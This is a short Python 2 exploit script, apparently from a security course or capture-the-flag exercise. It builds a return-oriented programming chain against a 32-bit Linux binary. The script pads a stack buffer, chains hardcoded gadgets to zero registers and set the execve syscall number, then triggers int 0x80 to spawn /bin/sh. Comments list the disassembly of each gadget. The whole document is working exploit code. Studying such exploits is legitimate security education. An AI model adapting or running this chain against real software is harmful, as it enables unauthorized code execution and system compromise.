from shellcode import shellcode
from struct import pack

shell = ("/bin/sh")
gad1 = pack("<I", 0x08057360)
gad2 = pack("<I", 0x08051750)
gad3 = pack("<I", 0x08050bfc)
gad4 = pack("<I", 0x0805dd06)
gad5 = pack("<I", 0x08057508)
gad6 = pack("<I", 0x0806a6bd)
gad7 = pack("<I", 0x080481ec)
INT = pack("<I", 0x080494f9)
shell = ("/bin/sh")

zero_reg = gad1+pack("<I", 0xbffea494)+'\xaa'*8+gad2+gad3+gad1+'\xaa'*12
eax_11 = gad4+'\xaa'*4+gad5+gad6+pack("<I", 0xbffea4ac)+INT+shell

print '\xaa'*112 + zero_reg + eax_11

 # INT
 # 80494f9:	cd 80                	int    $0x80

 # gad1
 # 8057360:	5a                   	pop    %edx
 # 8057361:	59                   	pop    %ecx
 # 8057362:	5b                   	pop    %ebx
 # 8057363:	c3                   	ret    

 # gad2
 # 8051750:	31 c0                	xor    %eax,%eax
 # 8051752:	c3                   	ret 

 # gad3
 # 8050bf0:	89 42 e4             	mov    %eax,-0x1c(%edx)
 # 8050bf3:	89 42 e8             	mov    %eax,-0x18(%edx)
 # 8050bf6:	89 42 ec             	mov    %eax,-0x14(%edx)
 # 8050bf9:	89 42 f0             	mov    %eax,-0x10(%edx)
 # 8050bfc:	89 42 f4             	mov    %eax,-0xc(%edx)
 # 8050bff:	89 42 f8             	mov    %eax,-0x8(%edx)
 # 8050c02:	89 42 fc             	mov    %eax,-0x4(%edx)
 # 8050c05:	8b 44 24 04          	mov    0x4(%esp),%eax
 # 8050c09:	c3                   	ret 

 # gad4
 # 805dd06:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
 # 805dd0b:	5b                   	pop    %ebx
 # 805dd0c:	c3                   	ret 

 # gad5
 # 8057508:	83 e0 0c             	and    $0xc,%eax
 # 805750b:	c3                   	ret  

 # gad6
 # 806a6bd:	83 e8 01             	sub    $0x1,%eax
 # 806a6c0:	5b                   	pop    %ebx
 # 806a6c1:	c3                   	ret

 # gad7
 # 80481ec:	5b                   	pop    %ebx
 # 80481ed:	c3                   	ret 

